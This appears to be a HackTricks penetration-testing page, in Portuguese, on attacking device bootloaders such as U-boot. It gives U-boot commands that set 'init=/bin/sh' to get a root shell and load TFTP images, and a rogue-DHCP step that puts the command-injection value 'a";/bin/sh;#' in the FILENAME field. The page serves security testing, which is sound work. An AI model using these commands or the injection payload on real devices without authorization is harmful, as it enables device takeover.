{{#include ../../banners/hacktricks-training.md}}

Os seguintes passos são recomendados para modificar as configurações de inicialização do dispositivo e bootloaders como U-boot:

1. **Acessar o Shell do Interpretador do Bootloader**:

- Durante a inicialização, pressione "0", espaço ou outros "códigos mágicos" identificados para acessar o shell do interpretador do bootloader.

2. **Modificar Argumentos de Inicialização**:

- Execute os seguintes comandos para adicionar '`init=/bin/sh`' aos argumentos de inicialização, permitindo a execução de um comando shell:
%%%
#printenv
#setenv bootargs=console=ttyS0,115200 mem=63M root=/dev/mtdblock3 mtdparts=sflash:<partitiionInfo> rootfstype=<fstype> hasEeprom=0 5srst=0 init=/bin/sh
#saveenv
#boot
%%%

3. **Configurar Servidor TFTP**:

- Configure um servidor TFTP para carregar imagens através de uma rede local:
%%%
#setenv ipaddr 192.168.2.2 #IP local do dispositivo
#setenv serverip 192.168.2.1 #IP do servidor TFTP
#saveenv
#reset
#ping 192.168.2.1 #verificar acesso à rede
#tftp ${loadaddr} uImage-3.6.35 #loadaddr pega o endereço para carregar o arquivo e o nome do arquivo da imagem no servidor TFTP
%%%

4. **Utilizar `ubootwrite.py`**:

- Use `ubootwrite.py` para gravar a imagem do U-boot e enviar um firmware modificado para obter acesso root.

5. **Verificar Recursos de Depuração**:

- Verifique se recursos de depuração como registro detalhado, carregamento de kernels arbitrários ou inicialização de fontes não confiáveis estão habilitados.

6. **Interferência Cautelosa de Hardware**:

- Tenha cuidado ao conectar um pino ao terra e interagir com chips SPI ou NAND flash durante a sequência de inicialização do dispositivo, especialmente antes da descompressão do kernel. Consulte o datasheet do chip NAND flash antes de encurtar pinos.

7. **Configurar Servidor DHCP Malicioso**:
- Configure um servidor DHCP malicioso com parâmetros prejudiciais para um dispositivo ingerir durante uma inicialização PXE. Utilize ferramentas como o servidor auxiliar DHCP do Metasploit (MSF). Modifique o parâmetro 'FILENAME' com comandos de injeção de comando como `'a";/bin/sh;#'` para testar a validação de entrada para procedimentos de inicialização do dispositivo.

**Nota**: Os passos que envolvem interação física com os pinos do dispositivo (\*marcados com asteriscos) devem ser abordados com extrema cautela para evitar danos ao dispositivo.

## Referências

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)

{{#include ../../banners/hacktricks-training.md}}
